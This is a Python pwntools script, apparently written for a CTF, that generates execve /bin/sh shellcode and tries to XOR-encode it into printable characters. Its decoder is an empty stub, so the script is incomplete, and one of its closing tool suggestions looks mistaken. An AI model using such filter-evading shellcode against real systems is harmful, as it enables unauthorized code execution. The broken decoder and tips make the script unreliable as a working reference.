#!/usr/bin/env python3
"""
生成可打印字符的 shellcode
使用简单的 XOR 编码方案
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def generate_printable_shellcode():
    """
    生成全是可打印字符的 shellcode
    策略: 使用字符位移和自解码
    """

    # 原始 shellcode (execve /bin/sh)
    shellcode = shellcraft.sh()

    # 获取字节码
    raw_bytes = asm(shellcode)
    print(f"[+] 原始 shellcode 长度: {len(raw_bytes)} 字节")
    print(f"[+] 原始 shellcode:\n{raw_bytes.hex()}")

    # 检查哪些字符不在允许范围内
    allowed = set(range(0x30, 0x5B))  # 0-9 :;<=>?@A-Z
    bad_chars = [b for b in raw_bytes if b not in allowed]

    if bad_chars:
        print(f"[!] 发现 {len(bad_chars)} 个非法字符")
        print(f"[!] 非法字符: {[hex(b) for b in set(bad_chars)]}")

        # 方法1: 尝试 XOR 编码
        print("\n[*] 尝试 XOR 编码...")
        for key in range(256):
            encoded = bytes([b ^ key for b in raw_bytes])
            if all(b in allowed for b in encoded):
                print(f"[+] 找到合适的 XOR key: 0x{key:02x}")
                print(f"[+] 编码后 shellcode:\n{encoded.hex()}")

                # 生成解码器 (也需要是可打印字符)
                decoder = generate_printable_decoder(key, len(encoded))
                print(f"[+] 解码器:\n{decoder.hex()}")

                return decoder + encoded

        print("[!] 没有找到简单的 XOR key")
        print("[!] 需要更复杂的编码方案")

    return raw_bytes

def generate_printable_decoder(xor_key, length):
    """
    生成可打印字符的解码器
    这是最困难的部分 - 解码器本身必须全是可打印字符
    """
    # 这是简化的示例，实际需要更复杂的逻辑
    # 实际 CTF 中，可能需要使用 alpha3 或类似工具

    # 暂时返回空，实际需要写完整的解码器
    return b''

def main():
    print("[*] 生成可打印字符 shellcode...")

    # 方案1: 直接尝试
    sc = generate_printable_shellcode()

    print("\n[*] 建议:")
    print("1. 如果系统有 Python2，使用原始 alpha3")
    print("2. 使用在线工具: https://www.exploit-db.com/exploits/37737")
    print("3. 使用 pwntools 的 pwnlib.shellcode.mips")
    print("4. 手工编写可打印字符的 shellcode")

if __name__ == "__main__":
    main()
